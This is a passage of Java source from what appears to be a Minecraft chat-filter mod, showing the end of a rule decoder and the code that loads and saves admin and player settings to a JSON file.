                if (ro.has("wt")) rule.setWarningText(ro.get("wt").getAsString());
                if (ro.has("rt")) rule.setReplacementText(ro.get("rt").getAsString());
                if (ro.has("ts")) rule.setTimeoutSeconds(ro.get("ts").getAsInt());
                rule.setLocked(true);
                rule.setEnabled(true);
                rules.add(rule);
            }
            return rules;
        } catch (Exception e) {
            ChatFilterMod.LOGGER.debug("[Columba] decodeRulesFromCode failed: {}", e.getMessage());
            return null;
        }
    }

    // ── Persistence ──────────────────────────────────────────────────────────

    public static void load() {
        if (!Files.exists(ADMIN_FILE)) return;
        try {
            String json = Files.readString(ADMIN_FILE);
            AdminData data = GSON.fromJson(json, AdminData.class);
            if (data != null && data.players != null) {
                players = new LinkedHashMap<>(data.players);
            }
            if (data != null && data.syncIntervalSeconds > 0) {
                syncIntervalSeconds = data.syncIntervalSeconds;
            }
        } catch (Exception e) {
            ChatFilterMod.LOGGER.error("[Columba] Admin config load failed: {}", e.getMessage());
        }
    }

    public static void save() {
        try {
            Files.createDirectories(ADMIN_FILE.getParent());
            AdminData data = new AdminData();
            data.adminUsername = ADMIN_USERNAME;
            data.players = new LinkedHashMap<>(players);
            data.syncIntervalSeconds = syncIntervalSeconds;
            Files.writeString(ADMIN_FILE, GSON.toJson(data));
        } catch (IOException e) {
            ChatFilterMod.LOGGER.error("[Columba] Admin config save failed: {}", e.getMessage());
        }
    }

    // ── Internal ─────────────────────────────────────────────────────────────

    private static class AdminData {
        String adminUsername = ADMIN_USERNAME;
        Map<String, PlayerData> players = new LinkedHashMap<>();
        int syncIntervalSeconds = 30;
    }
}
